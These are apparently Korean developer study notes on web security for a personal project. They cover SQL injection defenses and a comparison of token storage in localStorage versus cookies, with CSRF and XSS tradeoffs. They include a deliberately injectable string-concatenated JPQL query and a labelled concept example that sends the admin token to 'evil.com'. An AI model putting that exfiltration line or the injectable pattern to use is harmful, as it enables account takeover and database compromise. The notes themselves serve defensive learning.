"쿼리 메서드로 표현이 안 돼서 직접 JPQL/네이티브 쿼리를 문자열로 짤 때" 생긴다:

```java
// 위험한 예시 — 이 프로젝트에는 없지만, JPA를 쓴다고 무조건 안전한 건 아니라는 걸 보여주는 코드
String jpql = "SELECT p FROM Post p WHERE p.title = '" + userInput + "'"; // 여전히 이어붙이기
entityManager.createQuery(jpql).getResultList();
```

즉 "ORM/프레임워크를 쓰면 자동으로 안전하다"가 아니라 "쿼리 메서드나 `@Param` 바인딩처럼
자리표시자를 쓰는 경로로만 다니면 안전하다"가 더 정확한 문장이다. RottenNobleProject는 현재
전부 쿼리 메서드로 처리되어 이 위험 경로 자체가 코드에 없다.

## 비교표

| 방식 | 안전한가 | 이 프로젝트에서 |
|---|---|---|
| 문자열 이어붙이기 (`"... WHERE id = " . $id`) | 안전하지 않음 | 사용된 적 없음 |
| 준비된 문 + 자리표시자 (`bind_param`) | 안전함 | PHP 시절 전 구간 사용 |
| JPA 쿼리 메서드 (`findById` 등) | 안전함 | Spring Boot 전환 후 전 구간 사용 |
| JPQL/네이티브 쿼리를 문자열로 직접 조립 | 안전하지 않음(자리표시자 안 쓰면) | 사용된 적 없음 |

## 질문

- **Q. 이번에 실제로 뚫렸나?**
  A. 아니다. 스캔/프로빙 로그에서 인젝션 시도 패턴이 확인됐지만, 전체 DB 접근 엔드포인트를
  재감사한 결과 문자열 이어붙이기 쿼리가 하나도 없어 시도 자체가 그대로 실패했다. 그날 실제로
  드러난 진짜 갭은 인젝션이 아니라 로그인의 rate limit 부재였다(`Rate-Limiting.md`).

- **Q. Prepared statement만 쓰면 DB 관련 보안은 다 해결되나?**
  A. 인젝션 한정으로는 그렇다. 다만 이 프로젝트가 별도로 겪은 `Web/08_PITFALLS.md` §7 문제
  (Docker 컨테이너가 브릿지 네트워크라 `root@localhost` 계정으로 거부당한 것)를 해결하며 도입한
  "이 DB 하나에만 권한을 가진 전용 계정"도 같은 방향의 방어다 — 인젝션이 뚫리더라도 그 계정이
  볼 수 있는 범위 자체를 최소화하는 최소 권한 원칙(principle of least privilege)이라, 인젝션
  방어와는 층이 다르지만 같이 짚어둘 가치가 있다.

- **Q. NoSQL(Redis)도 인젝션에서 자유로운가?**
  A. Redis는 명령어와 인자가 프로토콜 수준에서 분리되어 있어(RESP 프로토콜) 이 프로젝트처럼
  `SET key value EX seconds` 식으로 인자를 배열로 넘기는 한 SQL 인젝션과 같은 문제는 생기지
  않는다. 다만 "NoSQL 인젝션"이라는 별도 범주(예: 사용자 입력을 명령어 자체로 실행하는 `EVAL`
  스크립트에 그대로 넣는 경우)는 존재한다 — 이 프로젝트는 그런 경로를 쓰지 않는다.

## 예시 코드

```php
// 이 프로젝트가 실제로 쓰는 방식 (backend/create_post.php)
$stmt = $conn->prepare("INSERT INTO posts (title, content) VALUES (?, ?)");
$stmt->bind_param("ss", $title, $content);
$stmt->execute();
```

```java
// Spring Boot 쪽 동일 지점 (PostService.java)
Post post = new Post();
post.setTitle(title);
post.setContent(content);
repository.save(post); // Hibernate가 파라미터 바인딩된 INSERT를 생성
```

## 실무

실무에서는 준비된 문/ORM을 기본으로 쓰는 것 외에, 방어를 여러 겹으로 둔다 — 입력값 검증(길이·
형식 제한, 이 프로젝트도 제목 255자·내용 필수 같은 검증을 이미 하고 있다), WAF(Web Application
Firewall)로 알려진 인젝션 패턴을 요청 단계에서 미리 차단, DB 계정의 최소 권한 부여, 그리고
정기적인 의존성/쿼리 감사가 함께 간다. "프레임워크가 알아서 막아준다"고 방심하지 않고, 직접
문자열 쿼리를 짜야 하는 예외 상황(복잡한 동적 정렬, 리포팅 쿼리 등)에서 특히 주의하는 게
실무에서 자주 강조되는 지점이다.

  보안 주제

# 토큰 저장 방식 — localStorage vs 쿠키

---

- **카테고리**: 네트워크/보안, 웹 개발
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project`

---

## 출처

`RottenNobleProject` — `RottenNobleProject-Architecture.md` 3회차(인증 흐름) 코드 학습에서
`frontend/src/api/auth.js`의 `localStorage` 사용을 보다가 분리한 주제. [CORS](../Network/CORS.md)에서
다룬 "왜 이 프로젝트는 CSRF에 상대적으로 안전한가"의 근본 원인이 바로 이 저장 방식이다.

## 정의

로그인 성공 후 서버가 준 토큰을 브라우저 어디에 보관할지 정하는 문제다. 가장 흔한 두 선택지가
**쿠키**(브라우저가 자동으로 관리하고, 설정에 따라 요청마다 자동으로 서버에 실어 보냄)와
**`localStorage`**(자바스크립트가 직접 읽고 써야 하는 브라우저 내장 키-값 저장소, 자동으로
요청에 실리지 않음)다.

## 요약

이 프로젝트는 토큰을 `localStorage`에 저장하고, 매 요청마다 자바스크립트가 직접
`Authorization: Bearer {token}` 헤더에 실어 보낸다 — 이 선택이 [CORS](../Network/CORS.md) 문서에서 본
"와일드카드가 있어도 CSRF는 안 통한다"는 결과의 진짜 원인이다. 대신 XSS(악성 스크립트 주입)
공격에는 쿠키 방식보다 더 취약하다는 대가가 있다.

## 상세

### 이 프로젝트의 실제 구현

```js
// frontend/src/api/auth.js
const TOKEN_KEY = 'rotten_admin_token';

export function getToken() {
  return localStorage.getItem(TOKEN_KEY);
}

export async function login(username, password) {
  // ... 서버에 로그인 요청 ...
  localStorage.setItem(TOKEN_KEY, body.data.token);
}

export function authHeaders() {
  const token = getToken();
  return token ? { Authorization: `Bearer ${token}` } : {};
}
```

로그인에 성공하면 토큰을 `localStorage`에 저장해두고, 이후 보호된 요청(`createPost` 등)을 보낼
때마다 `authHeaders()`가 그 값을 꺼내 헤더에 직접 실어준다. 브라우저는 이 과정에 전혀 개입하지
않는다 — 순전히 이 프로젝트의 자바스크립트 코드가 "토큰을 꺼내고, 헤더에 넣는다"는 두 동작을
직접 수행하고 있다.

### 쿠키였다면 무엇이 달라졌을까

만약 서버가 로그인 응답에서 `Set-Cookie: session=...` 헤더로 토큰을 내려줬다면, 그 뒤로는
브라우저가 알아서 그 쿠키를 **같은 도메인으로 가는 모든 요청에 자동으로** 실어 보낸다.
개발자가 매 요청마다 헤더를 직접 챙길 필요가 없어서 편리하지만, 바로 이 "자동으로"라는 성질이
[CORS 문서](../Network/CORS.md)에서 설명한 CSRF 문제의 근원이다 — 다른 사이트가 몰래 요청을 보내도
브라우저가 쿠키를 자동으로 붙여주기 때문이다.

### 왜 `localStorage`를 골랐는가 (추정)

이 프로젝트의 문서에는 `localStorage`를 선택한 이유가 명시적으로 남아있지는 않다. 다만 코드
구조로 보면, 기존 `RottenNoble-HttpServer`/`TCPServer`가 이미 헤더 기반 토큰 인증 방식으로
Redis 세션을 다루고 있었고([Redis](../Infrastructure/Redis.md), `MEMO-WEB-04`), 그 인프라와 일관된 인증
방식(Bearer 토큰)을 프런트에도 그대로 적용하다 보니 자연스럽게 "토큰을 어딘가에 저장했다가
헤더로 직접 실어 보내야 하는" `localStorage` 방식으로 이어진 것으로 보인다. 헤더 기반 인증은
애초에 쿠키가 아니므로, 저장 위치도 쿠키가 아닌 `localStorage`나 `sessionStorage`가 자연스러운
짝이 된다.

### `localStorage`의 진짜 약점 — XSS

`localStorage`는 CSRF에는 강하지만, **XSS(Cross-Site Scripting)**에는 쿠키보다 약하다. 만약
이 프로젝트의 프런트엔드 코드 어딘가에(예: 사용자 입력을 제대로 이스케이프하지 않고 화면에
그대로 렌더링하는 부분) 악성 스크립트가 주입될 수 있다면, 그 스크립트는
`localStorage.getItem('rotten_admin_token')`을 호출해서 토큰 값을 통째로 읽어낼 수 있다 — 그
값을 공격자의 서버로 전송하면 완전한 계정 탈취로 이어진다.

쿠키에는 `HttpOnly`라는 속성이 있는데, 이걸 설정하면 자바스크립트가 그 쿠키를 아예 읽을 수
없게 만들 수 있다 — XSS가 발생해도 스크립트가 쿠키 값 자체는 훔쳐가지 못한다(대신 그 스크립트가
쿠키를 실은 요청을 대신 보내게 만드는 방식의 공격은 여전히 가능하다). `localStorage`에는 이런
"자바스크립트로부터 격리"하는 옵션이 아예 없다 — 정의상 자바스크립트가 접근하기 위해 만들어진
저장소이기 때문이다.

## 비교표

| 항목 | `localStorage` (이 프로젝트) | 쿠키 (`HttpOnly` 미설정) | 쿠키 (`HttpOnly` 설정) |
|---|---|---|---|
| 요청에 자동으로 실리는가 | 아니오(직접 헤더에 넣어야 함) | 예(같은 도메인 요청마다 자동) | 예 |
| CSRF 취약성 | 낮음(토큰을 몰라서 위조 요청 못 만듦) | 높음(자동 첨부가 공격에 악용됨) | 높음(여전히 자동 첨부됨) |
| XSS로 값을 직접 읽을 수 있는가 | 예(`localStorage.getItem`으로 그대로) | 예(`document.cookie`로 읽힘) | **아니오**(자바스크립트 접근 차단) |
| 이 프로젝트의 선택 | **사용 중** | 사용 안 함 | 사용 안 함 |

## 질문

- **Q. 그럼 `HttpOnly` 쿠키가 항상 더 안전한 것 아닌가?**
  A. 각각 다른 공격에 강하다 — `HttpOnly` 쿠키는 XSS로부터 토큰 자체를 지켜주지만 CSRF에는
  여전히 노출되고(별도로 CSRF 토큰 같은 방어가 추가로 필요하다), `localStorage`는 CSRF에는
  강하지만 XSS로부터 토큰을 지켜주지 못한다. "어느 쪽이 절대적으로 낫다"가 아니라, 이 프로젝트가
  더 신경 써야 할 위협이 무엇인지에 따라 갈리는 트레이드오프다.

- **Q. 이 프로젝트는 XSS 위험에 실제로 얼마나 노출돼 있나?**
  A. 코드를 보면 사용자 입력(방명록 메시지, 글 내용)을 화면에 그대로 렌더링하는 부분이 있는데,
  React는 기본적으로 JSX에 들어간 문자열을 자동으로 이스케이프해준다(예:
  `<p>{message}</p>`처럼 쓰면 `<script>` 태그가 텍스트로만 표시되고 실행되지 않는다). `
  dangerouslySetInnerHTML`처럼 이 기본 방어를 일부러 우회하는 코드를 쓰지 않는 한, React
  자체가 가장 흔한 XSS 경로를 기본으로 막아준다 — 이 프로젝트가 그 위험한 API를 쓰고 있는지는
  아직 전체 코드를 다 확인하지 않았지만, 지금까지 읽은 페이지들에서는 보이지 않았다.

## 예시 코드

```js
// 공격자가 XSS를 성공시켰다고 가정할 때, localStorage 토큰이 얼마나 쉽게 유출되는지
// (이 프로젝트에 있는 코드가 아니라, 취약점의 위험성을 보여주기 위한 개념 예시)
fetch('https://evil.com/steal', {
  method: 'POST',
  body: localStorage.getItem('rotten_admin_token'),
});
```

```js
// 실제 이 프로젝트 코드 — 토큰을 헤더에 직접 실어 보내는 부분
export function authHeaders() {
  const token = getToken();
  return token ? { Authorization: `Bearer ${token}` } : {};
}
```

## 플로우차트

(생략 — 저장 위치에 따라 "자동으로 실리는가/아닌가"라는 단일 분기가 핵심이라 비교표로 충분하다.)

## 실무

실무에서는 두 방식 다 널리 쓰이지만, 최근 흐름은 "액세스 토큰은 메모리(자바스크립트 변수, 새로
고침하면 사라짐)에만 두고, 리프레시 토큰만 `HttpOnly` 쿠키에 둔다"는 절충안 쪽으로 기울고 있다
— XSS로부터는 액세스 토큰이 메모리에 있어 상대적으로 안전하고(페이지를 벗어나면 사라짐), 그
리프레시 토큰은 `HttpOnly`라 스크립트로 못 훔친다. `localStorage`에 토큰을 직접 두는 이
프로젝트의 방식은 구현이 단순하다는 장점이 있지만, 보안을 더 엄격히 요구하는 실무 서비스에서는
점점 덜 권장되는 패턴이다 — 다만 관리자 한 명만 쓰는 개인 프로젝트 규모에서 이 정도 절충은
합리적인 선택으로 볼 수 있다.
